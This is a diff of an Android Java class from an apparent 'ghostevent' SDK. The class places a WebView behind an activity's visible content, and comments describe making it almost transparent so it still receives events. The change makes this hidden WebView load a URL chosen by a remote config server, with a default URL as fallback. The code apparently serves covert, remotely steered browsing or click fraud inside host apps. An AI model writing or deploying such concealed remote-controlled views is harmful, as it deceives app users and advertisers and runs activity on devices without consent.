@@ -6,7 +6,6 @@ import android.view.ViewGroup;
 
 import androidx.annotation.NonNull;
 
-import com.nicolls.ghostevent.ghost.request.EventReporter;
 import com.nicolls.ghostevent.ghost.request.model.ConfigModel;
 import com.nicolls.ghostevent.ghost.request.network.NetRequest;
 import com.nicolls.ghostevent.ghost.request.network.OkHttpRequest;
@@ -51,8 +50,7 @@ public class ActivityGhost extends Ghost {
             ghostWebView = new GhostWebView(activity.getApplicationContext());
             ghostWebView.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,
                     ViewGroup.LayoutParams.MATCH_PARENT));
-            // setAlpha(0.001f);//不能设置成0，设置成0，将收不到事件，只要还有值 就可以接收到事件
-
+//            ghostWebView.setAlpha(0.001f);//不能设置成0，设置成0，将收不到事件，只要还有值 就可以接收到事件
 //            ghostWebView.setTranslationX(2500);
             viewGroup.addView(ghostWebView, 0);
             sendRequest();
@@ -84,15 +82,16 @@ public class ActivityGhost extends Ghost {
             @Override
             public void onNext(ConfigModel s) {
                 LogUtil.d(TAG, "onNext thread " + Thread.currentThread().getName());
-                if (s != null) {
-                    LogUtil.d(TAG, "onNext " + s.rawMessage);
+                if (s != null && s.result != null && s.result.enable) {
+                    LogUtil.d(TAG, "onNext " + s.toString());
+                    ghostWebView.start(s.result.url);
                 }
-                ghostWebView.start(url);
             }
 
             @Override
             public void onError(Throwable e) {
                 LogUtil.d(TAG, "onError thread " + Thread.currentThread().getName());
+                ghostWebView.start(url);
             }
 
             @Override
